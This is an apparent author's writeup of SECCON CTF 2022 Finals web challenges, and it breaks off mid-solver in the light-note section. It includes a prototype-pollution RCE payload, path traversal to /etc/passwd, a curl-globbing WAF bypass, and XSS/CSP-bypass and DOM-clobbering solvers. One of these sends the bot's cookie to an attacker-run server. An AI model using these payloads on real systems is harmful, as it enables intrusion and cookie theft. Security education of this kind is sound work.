---
title: "SECCON CTF 2022 Finals: Author writeups"
thumbnail: /images/2023/20230217-seccon-finals-top.jpg
date: 2023-02-17 23:00:00
tags:
    - CTF
description: Writeups for my challenges (babybox, easylfi2, MaaS, light-note, and dark-note) in SECCON CTF 2022 Finals.
---

I wrote all the web challenges in SECCON CTF 2022 Finals, following the [Quals](https://blog.arkark.dev/2022/11/18/seccon-ja/) round. Thank you for participating in the CTF and I was glad to receive positive feedback at the after-party and on Twitter/Discord.

<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">よろしくお願いします <a href="https://t.co/dAsizpvpLv">pic.twitter.com/dAsizpvpLv</a></p>&mdash; Ark (@arkark_) <a href="https://twitter.com/arkark_/status/1624200571308892161?ref_src=twsrc%5Etfw">February 11, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

In this post, I describe my solution for the following challenges:
|Challenge|Category|Intended<br>Difficulty|Score<br>(static)|Solved / 10<br>(Internatinal)|Solved / 12<br>(Domestic)|
|:-:|:-:|:-:|:-:|:-:|:-:|
|babybox|web|warmup|100|6|4|
|easylfi2|web|easy|200|10|8|
|MaaS|web|medium|300|3|1|
|light-note|web|medium|300|0|0|
|dark-note|web|hard|500|0|0|

I added the source code and author's solvers to [my-ctf-challenges](https://github.com/arkark/my-ctf-challenges) repository.

## [web 100] babybox

- International: 6 solved / 10
- Domestic:  4 solved / 12
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202302_SECCON_CTF_2022_Finals/web/babybox

Description:

> Can you hack this sandbox?
>
> - `http://babybox.{int,dom}.seccon.games:3000`

### Overview

The server-side source code is very simple:

```javascript
const fastify = require("fastify")();
const fs = require("node:fs").promises;
const execFile = require("util").promisify(require("child_process").execFile);

const PORT = process.env.PORT ?? "3000";

fastify.get("/", async (req, reply) => {
  const html = await fs.readFile("index.html");
  return reply.type("text/html; charset=utf-8").send(html);
});

fastify.post("/calc", async (req, reply) => {
  const { expr } = req.body;
  try {
    const result = await execFile("node", ["./calc.js", expr.toString()], {
      timeout: 1000,
    });
    return result.stdout;
  } catch (err) {
    return reply.code(500).send(err.killed ? "Timeout" : err);
  }
});

fastify.listen({ port: PORT, host: "0.0.0.0" });
```

In `POST /calc`, the server executes `calc.js` as a subprocess with a parameter `expr` and returns the result. The implementation of `calc.js` is as follows:

```javascript
const { Parser } = require("expr-eval");

const expr = process.argv[2].trim();
console.log(new Parser().evaluate(expr));
```

This is also simple.

- `expr-eval`: https://github.com/silentmatt/expr-eval

As you can see from `Dockerfile`, the file name of a flag is unknown:
```Dockerfile
FROM node:19.6.0-slim
ENV NODE_ENV=production
WORKDIR /app

COPY ["package.json", "package-lock.json", "./"]
RUN npm install --omit=dev
COPY . .
RUN mv flag.txt /flag-$(md5sum flag.txt | cut -c-32).txt

USER 404:404

CMD ["node", "index.js"]
```

Thus, this is a JavaScript sandbox challenge and the goal is RCE.

### Solution

The server uses the latest of `expr-eval`, so is this challenge a 0-day RCE?

No.

You can find [this open issue](https://github.com/silentmatt/expr-eval/issues/266) from the repository in GitHub. According to this, the latest version (published to npm) has a vulnerability although it was already patched on the latest commit. The vulnerability is Prototype Pollution:

- https://github.com/silentmatt/expr-eval/pull/252

So, what you should do is "Prototype Pollution to RCE"[^babybox-1].

[^babybox-1]: Actually, I discovered the Prototype Pollution before I found this report. Although I don't like 0-day challenges in CTF, it's not 0-day in this case. Also, the part of "Prototype Pollution to RCE" is interesting for me. So I decided to create this challenge.

For this type of JavaScript sandbox challenges, it's often important to somehow obtain `eval` or `Function.prototype.constructor` to RCE.

In REPL of Node.js, I tried many things and found the following useful behavior:
```javascript
> Object.getPrototypeOf(toString) === Function.prototype
true
> Object.getOwnPropertyDescriptor(Object.getPrototypeOf(toString), "constructor")
{
  value: [Function: Function],
  writable: true,
  enumerable: false,
  configurable: true
}
> Object.getOwnPropertyDescriptor(Object.getPrototypeOf(toString), "constructor").value === Function.prototype.constructor
true
> value
Uncaught ReferenceError: value is not defined
> Object.assign(__proto__, Object.getOwnPropertyDescriptor(Object.getPrototypeOf(toString), "constructor"))
{
  value: [Function: Function],
  writable: true,
  enumerable: false,
  configurable: true
}
> value
[Function: Function]
> value("console.log('polluted!!')")()
polluted!!
undefined
```

The code is polluting `value` to `Function.prototype.constructor`. Finally, my `expr` is:
```javascript
o = constructor;
o.assign(__proto__, o.getOwnPropertyDescriptor(o.getPrototypeOf(toString), "constructor"));
f = value("return global.process.mainModule.constructor._load(`child_process`).execSync(`id`).toString()");
f()
```

Got a RCE!

### Solver

```python
import os
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"


def evaluate(command: str) -> str:
    res = httpx.post(
        f"{BASE_URL}/calc",
        json={
            "expr": f'o = constructor; o.assign(__proto__, o.getOwnPropertyDescriptor(o.getPrototypeOf(toString), "constructor")); f = value("return global.process.mainModule.constructor._load(`child_process`).execSync(`{command}`).toString()"); f()'
        },
    )
    return res.text


files = evaluate("ls /").splitlines()
for file in files:
    if file.startswith("flag-"):
        print(evaluate(f"cat /{file}"))
```

### Flag

```
SECCON{pr0totyp3_po11ution_iS_my_friend}
```

## [web 200] easylfi2

- International: 10 solved / 10
- Domestic: 8 solved / 12
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202302_SECCON_CTF_2022_Finals/web/easylfi2

Description:

> [easylfi](https://github.com/SECCON/SECCON2022_online_CTF/tree/main/web/easylfi) again! I know you fully understand everything about curl.
>
> - `http://easylfi2.{int,dom}.seccon.games:3000`

### Overview

The server-side code is as follows:

```javascript
const app = new (require("koa"))();
const execFile = require("util").promisify(require("child_process").execFile);

const PORT = process.env.PORT ?? "3000";

// WAF
app.use(async (ctx, next) => {
  await next();
  if (JSON.stringify(ctx.body).match(/SECCON{\w+}/)) {
    ctx.body = "🤔";
  }
});

app.use(async (ctx) => {
  const path = decodeURI(ctx.path.slice(1)) || "index.html";
  try {
    const proc = await execFile(
      "curl",
      [`file://${process.cwd()}/public/${path}`],
      { timeout: 1000 }
    );
    ctx.type = "text/html; charset=utf-8";
    ctx.body = proc.stdout;
  } catch (err) {
    ctx.body = err;
  }
});

app.listen(PORT);
```

It is obviously vulnerable for path traversal.

```shell
$ http --path-as-is "http://localhost:3000/../../../../etc/passwd"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 961
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Feb 2023 16:49:50 GMT
Keep-Alive: timeout=5

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... snip ...
```

However, the WAF disallows responses including a flag.

```shell
$ http --path-as-is "http://localhost:3000/../../../../flag.txt"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 4
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Feb 2023 16:52:27 GMT
Keep-Alive: timeout=5

🤔
```

The goal in this challenge is bypassing the WAF.

### Solution

```javascript
// WAF
app.use(async (ctx, next) => {
  await next();
  if (JSON.stringify(ctx.body).match(/SECCON{\w+}/)) {
    ctx.body = "🤔";
  }
});
```

In this part, why is `JSON.stringify` used?
Are there cases that `ctx.body` is not `string`?

Yes.

If a subprocess causes an error, `ctx.body` becames the error object:
```javascript
  } catch (err) {
    ctx.body = err;
  }
```

E.g.:
```shell
$ http --path-as-is "http://localhost:3000/aaa"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 147
Content-Type: application/json; charset=utf-8
Date: Tue, 14 Feb 2023 17:04:58 GMT
Keep-Alive: timeout=5

{
    "cmd": "curl file:///app/public/aaa",
    "code": 37,
    "killed": false,
    "signal": null,
    "stderr": "curl: (37) Couldn't open file /app/public/aaa\n",
    "stdout": ""
}
```

If you can cause an error including a substring of a flag so that it don't match with `/SECCON{\w+}/`, you can avoid the WAF and get the substring in the response body.

Here, you need one idea: what would happen if the stdout of a subprocess is very very very large?

```shell
$ http --path-as-is "http://localhost:3000/../../../../bin/bash"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 2320247
Content-Type: application/json; charset=utf-8
Date: Tue, 14 Feb 2023 17:12:31 GMT
Keep-Alive: timeout=5

{
    "cmd": "curl file:///app/public/../../../../bin/bash",
    "code": "ERR_CHILD_PROCESS_STDIO_MAXBUFFER",
    "stderr": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0",
    "stdout": "ELF\u0002\u0001\u0001\u0000\u0000\u0000...snip..."
}
```

It causes an error and the `stdout` of the error object is a prefix of the file content.

[Noje.js docs](https://nodejs.org/dist/latest-v19.x/docs/api/child_process.html#child_processexecfilefile-args-options-callback) says the following for `maxBuffer` option of `execFile`:

> `maxBuffer` `<number>`: Largest amount of data in bytes allowed on stdout or stderr. If exceeded, the child process is terminated and any output is truncated. See caveat at maxBuffer and Unicode. Default: 1024 * 1024.

So, with this specification, making `"SECCON{...}".slice(0, -1)` as a result of curl execution is to steal a flag. In fact, it is possible using URL globbing of curl. See the following Solver section.

### Solver

```python
import os
import re
import subprocess

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"


def curl(files: list[str]) -> bytes:
    proc = subprocess.run(
        [
            "curl",
            "--globoff",
            "--path-as-is",
            BASE_URL + "/../../{" + ",".join(files) + "}",
        ],
        capture_output=True
    )
    assert proc.returncode == 0
    return proc.stdout


files = [
    "bin/tar",
    "bin/sed",
    "bin/gunzip",
    "app/package.json",
    "app/package.json",
    "app/package.json",
    "app/package.json",
    "app/package.json",
]

assert len(curl(files)) < 1024 * 1024
assert len(curl(files)) == 1048467

for i in range(1000):
    flag_file = "/"*i + "flag.txt"
    stdout = curl(files + [flag_file]).decode()
    if stdout == "🤔":
        continue
    else:
        print(f"{i = }")
        print(re.search(r"SECCON{\w+", stdout).group(0) + "}")
        exit(0)
print("Failed")
```

### Flag

```
SECCON{Wha7_files_did_you_use_to_s0lve_1t}
```

## [web 300] MaaS

- International: 3 solved / 10
- Domestic: 1 solved / 12
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202302_SECCON_CTF_2022_Finals/web/maas

Description:

> Minifier as a Service
>
> - `http://maas.{int,dom}.seccon.games:3000`

### Overview

![](/images/2023/20230217-seccon-finals-maas-01.png)

If you post a JavaScript code, you will get a minified code and the compression rate:

![](/images/2023/20230217-seccon-finals-maas-02.png)

Also, you can report a JavaScript code to a bot, then the bot submits the given code on the web service.

The bot program is as follows:

```javascript
const visit = async (code) => {
  console.log(`start: ${JSON.stringify(code)}`);
  const url = `http://${APP_HOST}:${APP_PORT}`;

  const browser = await puppeteer.launch({
    headless: false,
    executablePath: "/usr/bin/google-chrome-stable",
    args: ["--no-sandbox"],
  });
  const context = await browser.createIncognitoBrowserContext();

  const page = await context.newPage();
  await page.setCookie({
    name: "FLAG",
    value: FLAG,
    domain: APP_HOST,
    path: "/",
  });

  try {
    await page.goto(url, { timeout: 1000 });
    await sleep(1 * 1000);
    await page.waitForSelector("#originalCode");
    await page.type("#originalCode", code);
    await page.waitForSelector("#minify");
    await page.click("#minify");
    await sleep(10 * 1000);
  } catch (e) {
    console.log(e);
  }
  await page.close();

  await context.close();
  await browser.close();

  console.log(`end: ${JSON.stringify(code)}`);
};
```

The goal is to get the flag cookie of the bot by XSS.

### Solution

#### Step 1: Newline normalizations in form submissions


The implementation of the form submission is as follows:

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="https://unpkg.com/simpledotcss/simple.min.css">
  <title>MaaS</title>
  <script src="https://cdn.jsdelivr.net/npm/terser/dist/bundle.min.js"></script>
</head>
<body>
  <h1>Minifier as a Service</h1>
  <p>Your JavaScript program:</p>
  <form id="form" method="post" action="/post">
    <textarea id="originalCode" rows="5" placeholder="const ans = (1 + 2 + 3) * 7;&#10;alert(ans);"></textarea>
    <textarea id="minifiedCode" name="minifiedCode" style="display:none;"></textarea>
    <input type="hidden" id="originalLength" name="originalLength"></input>
    <input type="hidden" id="minifiedLength" name="minifiedLength"></input>
    <div style="display: flex; justify-content: space-between;">
      <button id="minify" type="submit">Minify</button>
      <button id="report" type="button">Report</button>
    </div>
  </form>
  <script>
    form.addEventListener("submit", (event) => {
      const elements = event.target.elements;
      const originalCode = elements.originalCode.value;

      Terser.minify(originalCode)
        .then(({ code: minifiedCode }) => {
          elements.minifiedCode.value = minifiedCode;
          elements.originalLength.value = originalCode.length;
          elements.minifiedLength.value = minifiedCode.length;
          form.submit();
        })
        .catch((err) => {
          alert(`Failed to minify the code:\n${err}`);
        });

      event.preventDefault();
    });

    /* snip */
  </script>
</body>
</html>
```

Your code is minified with [terser](https://github.com/terser/terser) and the following values are sent to `POST /post`:

- `minifiedCode`: the string of the minified code
- `originalLength`: the length of the original code
- `minifiedLength`: the length of the minified code

Then, the server processes them as follows:

```javascript
const escapeHtml = (unsafeStr, offset1, length1, offset2, length2) => {
  return (
    unsafeStr.substring(0, offset1) +
    unsafeStr
      .substring(offset1, offset1 + length1)
      .replaceAll("&", "&amp;")
      .replaceAll("<", "&lt;")
      .replaceAll(">", "&gt;")
      .replaceAll('"', "&quot;")
      .replaceAll("'", "&#039;") +
    unsafeStr.substring(offset1 + length1, offset2) +
    unsafeStr
      .substring(offset2, offset2 + length2)
      .replaceAll("&", "&amp;")
      .replaceAll("<", "&lt;")
      .replaceAll(">", "&gt;")
      .replaceAll('"', "&quot;")
      .replaceAll("'", "&#039;") +
    unsafeStr.substring(offset2 + length2)
  );
};

fastify.post("/post", async (req, reply) => {
  const nonce = crypto.randomBytes(16).toString("base64");

  const originalLength = parseInt(req.body.originalLength);
  const minifiedLength = parseInt(req.body.minifiedLength);
  const minifiedCode = req.body.minifiedCode;

  const templateHtml = (await fs.readFile("views/result.html"))
    .toString()
    .replaceAll("{{CSP_NONCE}}", nonce)
    .replaceAll("{{ORIGINAL_LENGTH}}", originalLength)
    .replaceAll("{{MINIFIED_LENGTH}}", minifiedLength);
  const html = templateHtml.replaceAll("{{MINIFIED_CODE}}", minifiedCode);

  return reply.type("text/html; charset=utf-8").send(
    escapeHtml(
      html,

      // (offset, length) of the first {{MINIFIED_CODE}}:
      templateHtml.indexOf("{{MINIFIED_CODE}}"),
      minifiedLength,

      // (offset, length) of the second {{MINIFIED_CODE}}:
      templateHtml.lastIndexOf("{{MINIFIED_CODE}}") +
        (minifiedLength - "{{MINIFIED_CODE}}".length),
      minifiedLength
    )
  );
});
```

`views/result.html`:
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta
    content="default-src 'self'; base-uri 'none'; object-src 'none'; style-src https://unpkg.com/simpledotcss/simple.min.css; script-src 'nonce-{{CSP_NONCE}}'"
    http-equiv="Content-Security-Policy"
  >
  <link rel="stylesheet" href="https://unpkg.com/simpledotcss/simple.min.css">
  <title>MaaS</title>
</head>
<body>
  <h1>Minifier as a Service</h1>
  <p>Result:</p>
  <pre><code>{{MINIFIED_CODE}}</code></pre>
  <p>Compression rate: <span id="compressionRate"></span></p>
  <script nonce="{{CSP_NONCE}}">
    (() => {
      const minifiedLength = {{MINIFIED_LENGTH}};
      const originalLength = {{ORIGINAL_LENGTH}};
      const rate = ((minifiedLength / originalLength) * 100) | 0;
      document.getElementById("compressionRate").innerHTML = `<b>${rate}%</b> (= ${minifiedLength} / ${originalLength})`;
    })();
  </script>
  <a href="/#{{MINIFIED_CODE}}"><button type="button" id="edit">Edit</button></a>
</body>
</html>
```

The function `escapeHtml` escapes the minified code to avoid XSS. The program assumes that `minifiedLength` is the length of the code.

Why it uses `minifiedLength` rather than `minifiedCode.length` as the length value? If the value of `minifiedLength` is controllable and is not equal to `minifiedCode.length`, you might be able to break the sanitization.

Here, you need to know an interesting behavior for form submissions. It is **"newline normalization"**.

I prepared a playground to try the behavior:
```html
<form id="form" method="post">
  <textarea id="text" name="text"></textarea>
  <button type="submit">submit</button>
</form>
```

When you input a string including `\n` and submit it, the `\n` is converted to `\r\n`:

![](/images/2023/20230217-seccon-finals-maas-03.png)
![](/images/2023/20230217-seccon-finals-maas-04.png)

I found a detailed post on newline normalizations. See it if you are interested:

- https://blog.whatwg.org/newline-normalizations-in-form-submission

Anyway, using `\n` seems to make sense. However, the `\n` characters will be erased by the minifier unfortunately:cry:.

Is there a way to maintain `\n` characters? See the documentation of `terser`:

- ref. https://github.com/terser/terser#format-options

> `comments` (default `"some"`) -- by default it keeps JSDoc-style comments that contain "@license", "@copyright", "@preserve" or start with `!`, pass `true` or `"all"` to preserve all comments, `false` to omit comments in the output, a regular expression string (e.g. `/^!/`) or a function.

The service uses default options for `terser`, so you can maintain `\n` characters using copyright comments like `/*! foo\nbar */`.

#### Step 2: CSP bypass

The service uses the following CSP:

```
default-src 'self';
base-uri 'none';
object-src 'none';
style-src https://unpkg.com/simpledotcss/simple.min.css;
script-src 'nonce-{{CSP_NONCE}}'
```

You should bypass it to XSS.

The first step of CSP bypass is using `<meta>` to redirect to a web site that you prepared.

For example, the following `code` causes a redirection:
```javascript
const meta = `<meta http-equiv="Refresh" content="0; URL=${ATTACK_BASE_URL}">`;
const code = `/*!${"\n".repeat(meta.length + 3)}${meta}*/\n`;
```

The many `\n` characters will be not erased by the minifier and will be converted to `\r\n` characters in a form submission. So, the value of `minifiedLength` will be `minifiedCode.length - (meta.length + 3)`. Then, it will bypass `escapeHtml` and will redirect to `ATTACK_BASE_URL`.

In your redirected web site, you can controll submit values freely by CSRF. Now all you have to do is gain XSS using appropriate values of `minifiedCode`, `originalLength`, and `minifiedLength`.


Finally, you need to break the rendering of `escapeHtml` so that the CSP nonce is applied to an injected script. See `index.html` of my solver below[^maas-1].

My solution abuses the behavior of `substring` used in `escapeHtml`:

- ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/substring#description

> If `indexStart` is greater than `indexEnd`, then the effect of `substring()` is as if the two arguments were swapped; see example below.

[^maas-1]: The CSP bypass is too complicated to explain. So, please try it with your hands :raised_hands:

### Solver

`index.js`:
```javascript
const fastify = require("fastify")();
const fs = require("node:fs").promises;

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const meta = `<meta http-equiv="Refresh" content="0; URL=${ATTACK_BASE_URL}">`;
  const code = `/*!${"\n".repeat(meta.length + 3)}${meta}*/\n`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        code,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.get("/print", async (req, reply) => {
    console.log(req.query.cookie); // Print a flag
    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(2 * 1000);
      await exploit();

      await sleep(10 * 1000);
      fail("Failed");
    }
  );
};
start();
```

`index.html`:
```html
<body>
  <script>
    const submit = (url, { minifiedCode, originalLength, minifiedLength }) => {
      const innerHtml = `
        <form action="${url}" method="post" target="_blank">
          <input name="minifiedCode" value="${minifiedCode}">
          <input name="originalLength" value="${originalLength}">
          <input name="minifiedLength" value="${minifiedLength}">
        </form>
      `;
      document.body.innerHTML += innerHtml;
      document.forms[document.forms.length - 1].submit();
    };

    const exploit = (url, xss) => {
      const evil = ";`*/<" + "/script>`/*";
      const len = 93;
      submit(url, {
        minifiedCode: (xss + evil).padStart(len, " "),
        originalLength: 0,
        minifiedLength: -304 + len,
      });
    };

    const baseUrl = "http://web:3000";
    exploit(
      `${baseUrl}/post#${encodeURIComponent(location.origin + "/print?cookie=")}`,
      "location = `${decodeURIComponent(location.hash.slice(1))}${document.cookie}`"
    );
  </script>
</body>
```

### Flag

```
SECCON{csp_bypa55_is_a_type_0f_puzzle_games_for_h4ckerS}
```

## [web 300] light-note

- International: 0 solved / 10
- Domestic: 0 solved / 12
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202302_SECCON_CTF_2022_Finals/web/light-note

Description:

> I created a blazing fast note application!
>
> - `https://light-note.{int,dom}.seccon.games`

### Overview

There is a simple note application. You can create and delete notes:

![](/images/2023/20230217-seccon-finals-light-note-01.png)

Also, you can report a URL to a bot, then the bot executes the following program:

```javascript
const visit = async (url) => {
  console.log(`start: ${JSON.stringify(url)}`);

  const baseUrl = `http://${APP_HOST}:${APP_PORT}`;
  /*
    To CTF players:
    Don't forget the hostname is not `web` but `localhost`.
   */

  const browser = await puppeteer.launch({
    headless: false,
    executablePath: "/usr/bin/google-chrome-stable",
    args: ["--no-sandbox"],
  });
  const context = await browser.createIncognitoBrowserContext();

  try {
    const page1 = await context.newPage();

    await page1.goto(baseUrl, { timeout: 3000 });
    await sleep(0.5 * 1000);

    await page1.waitForSelector("#note");
    await page1.type("#note", FLAG);
    await page1.waitForSelector("#createNote");
    await page1.click("#createNote");
    await sleep(0.5 * 1000);

    await page1.close();
    await sleep(1 * 1000);

    const page2 = await context.newPage();
    await page2.goto(url, { timeout: 3000 });
    await sleep(60 * 1000);
    await page2.close();
  } catch (e) {
    console.log(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${JSON.stringify(url)}`);
};
```

The goal is to steal the first note of the bot.

### Solution

The HTML file is as follows:

```html
<!DOCTYPE html>
<html data-theme="light">
<head>
  <meta charset="UTF-8">
  <title>Light Note</title>
  <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.min.css">
  <script type="importmap">
    {
      "imports": {
        "DOMPurify": "https://cdn.jsdelivr.net/npm/dompurify@2.4.3/dist/purify.es.min.js"
      }
    }
  </script>
</head>
<body>
  <main class="container">
    <article>
      <h2 style="margin-bottom: 1rem;">💡 Light Note</h2>
      <table>
        <tbody id="notes"></tbody>
      </table>
      <input type="text" id="note" name="note" required>
      <div style="display: flex; justify-content: end;">
        <a id="createNote" href="#" role="button">Create</a>
      </div>
    </article>
    <article>
      <input type="text" id="url" name="url" required placeholder="https://example.com">
      <div style="display: flex; justify-content: end;">
        <a id="report" href="#" role="button">Report</a>
      </div>
    </article>
    <p style="display: flex; justify-content: end;">
      <a href="/logout">Logout</a></p>
    </p>
  </main>
  <template id="noteTmpl">
    <tr><th>
      <nav>
        <ul><li class="note" style="word-break: break-all;"></li></ul>
        <ul><li><a href="#" role="button" class="delete secondary">Delete</a></li></ul>
      </nav>
    </th></tr>
  </template>
  <script type="module">
    /* snip */

    const write = async (element, input) => {
      try {
        element.setHTML(input, {
          sanitizer: new Sanitizer({ dropElements: ["link", "style"] })
        });
      } catch (e) {
        await import("DOMPurify").then(({ default: DOMPurify }) => {
          // fallback: Firefox does not support Sanitizer API yet.
          element.innerHTML = DOMPurify.sanitize(input);
        }).catch((e) => {
          // fallback: Safari does not support import maps :(
          element.innerHTML = input.replace(/[<>'"&]/, "");
        });
      }
    };

    const refresh = async () => {
      const notes = await fetch("/api/notes").then(r => r.json());

      const root = document.getElementById("notes");
      root.innerHTML = "";
      for (const [index, note] of Object.entries(notes)) {
        const elm = document.getElementById("noteTmpl").content.cloneNode(true);
        write(elm.querySelector(".note"), note);
        elm.querySelector(".delete").addEventListener("click", async () => {
          await deleteNote(index);
          await refresh();
        });
        root.appendChild(elm);
      }
    };

    const init = async () => {
      await refresh();

      /* snip */
    };

    document.addEventListener("DOMContentLoaded", init);
  </script>
</body>
</html>
```

When each note is rendered, the `write` function is used:

```javascript
    const write = async (element, input) => {
      try {
        element.setHTML(input, {
          sanitizer: new Sanitizer({ dropElements: ["link", "style"] })
        });
      } catch (e) {
        await import("DOMPurify").then(({ default: DOMPurify }) => {
          // fallback: Firefox does not support Sanitizer API yet.
          element.innerHTML = DOMPurify.sanitize(input);
        }).catch((e) => {
          // fallback: Safari does not support import maps :(
          element.innerHTML = input.replace(/[<>'"&]/, "");
        });
      }
    };
```

The function uses [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) as a sanitizer. If an error occurs in the sanitizer, [DOMPurify](https://github.com/cure53/DOMPurify) will be used as a fallback. Also, if an error occurs in [import maps](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap)[^light-note-1] or DOMPurify, `input.replace(/[<>'"&]/, "")` will be used as a fallback. Obliviously, the `replace` is vulnerable for XSS because the regex uses no flags such as `/g`.

[^light-note-1]: Firefox has recently added support for import maps at version 108 :tada:<br>ref. https://www.mozilla.org/en-US/firefox/108.0/releasenotes/

Thus, what you should do is to make errors so that the second fallback is used, and then you gain XSS.

Here, you need to know security considerations for Sanitizer API:

- ref. https://wicg.github.io/sanitizer-api/#security-considerations

> 4.2. DOM clobbering<br>
> This section is not normative.<br>
> DOM clobbering describes an attack in which malicious HTML confuses an application by naming elements through id or name attributes such that properties like children of an HTML element in the DOM are overshadowed by the malicious content.<br>
> The Sanitizer API does not protect DOM clobbering attacks in its default state, but can be configured to remove id and name attributes.

The sanitizer in `write` is not configured to remove id and name attributes. So, it does not protect DOM Clobbering attacks.

Firstly, let's break `element.setHTML(...)` by DOM Clobbering.

```javascript
    const refresh = async () => {
      const notes = await fetch("/api/notes").then(r => r.json());

      const root = document.getElementById("notes");
      root.innerHTML = "";
      for (const [index, note] of Object.entries(notes)) {
        const elm = document.getElementById("noteTmpl").content.cloneNode(true);
        write(elm.querySelector(".note"), note);
        elm.querySelector(".delete").addEventListener("click", async () => {
          await deleteNote(index);
          await refresh();
        });
        root.appendChild(elm);
      }
    };
```

If the following value is not a function, an error will occur:
```javascript
document
  .getElementById("noteTmpl")
  .content
  .cloneNode(true)
  .querySelector(".note")
  .setHTML
```

Also, the following value must be an `Element` object so that the assignment to `innerHTML` in the second fallback is valid:
```javascript
document
  .getElementById("noteTmpl")
  .content
  .cloneNode(true)
  .querySelector(".note")
```

These are completed by the following DOM..., really?
```html
<form id="noteTmpl">
  <button name="content">
    <form class="note">
      <input name="setHTML">
    </form>
  </button>
</form>
```

Try to create the note:

![](/images/2023/20230217-seccon-finals-light-note-02.png)
![](/images/2023/20230217-seccon-finals-light-note-03.png)

Then, the following value is `null`:

![](/images/2023/20230217-seccon-finals-light-note-04.png)

Why? See the DOM:

![](/images/2023/20230217-seccon-finals-light-note-05.png)

The inner `<form>` element was removed :exploding_head:

See HTML Living Standard:

- ref. https://html.spec.whatwg.org/#the-form-element

> 4.10.3 The form element
> ...
> Content model:
> <span style="margin-left: 2rem;">Flow content, but with no form element descendants.</span>

Nested form elements violate the content model of `<form>`. So, the browser removes the inner `<form>` when constructing a DOM tree for the input[^light-note-2].

[^light-note-2]: However, we can construct nested forms by DOM manipulation in JavaScript.<br>E.g. `document.body.appendChild(document.createElement("form")).appendChild(document.createElement("form"))`<br>ref. https://html.spec.whatwg.org/#association-of-controls-and-forms

Hmm..., is there anything that could replace nested forms?

My solution uses `form` atttibute:

- ref. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/button#attr-form

The following is valid as a DOM tree:

```html
<form id="noteTmpl"></form>
<button name="content" form="noteTmpl">
  <form class="note">
    <input name="setHTML">
  </form>
</button>
```

Then, you can get expected results if you create the note:

![](/images/2023/20230217-seccon-finals-light-note-06.png)
![](/images/2023/20230217-seccon-finals-light-note-07.png)

You could break Sanitizer API by DOM Clobbering!

Next, you need to break import maps or DOMPurify, but this part is easier than the above.

Read the source code of DOMPurify:

- https://github.com/cure53/DOMPurify/blob/2.4.3/dist/purify.es.js#L333-L338

```javascript
  if (!window || !window.document || window.document.nodeType !== 9) {
    // Not running in a browser, provide a factory function
    // so that you can pass your own Window
    DOMPurify.isSupported = false;
    return DOMPurify;
  }
```

If `window.document.nodeType` is clobbered, DOMPurify will stop defining `DOMPurify.sanitize`. Then, an error will occur in `DOMPurify.sanitize(input)` and the second fallback will be used.

The DOM Clobbering to break DOMPurify is:
```html
<img name="nodeType">
```

In summary, you can gain XSS by creating the following notes with CSRF.

First note:
```html
<form id="noteTmpl"></form>
<button name="content" form="noteTmpl">
  <form class="note">
    <input name="setHTML">
  </form>
  <p class="delete"></p>
</button>
<img name="nodeType">
```

Second note:
```html
<<img src=0 onerror="alert(1)">
```

### Solver

`index.js`:
```javascript
const fastify = require("fastify")();
const fs = require("node:fs").promises;

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const reportUrl = async (url) => {
  const res = await fetch(`${SECCON_BASE_URL}/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      url,
    }),
  }).then((r) => r.text());
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.post("/", async (req, reply) => {
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err.toString());

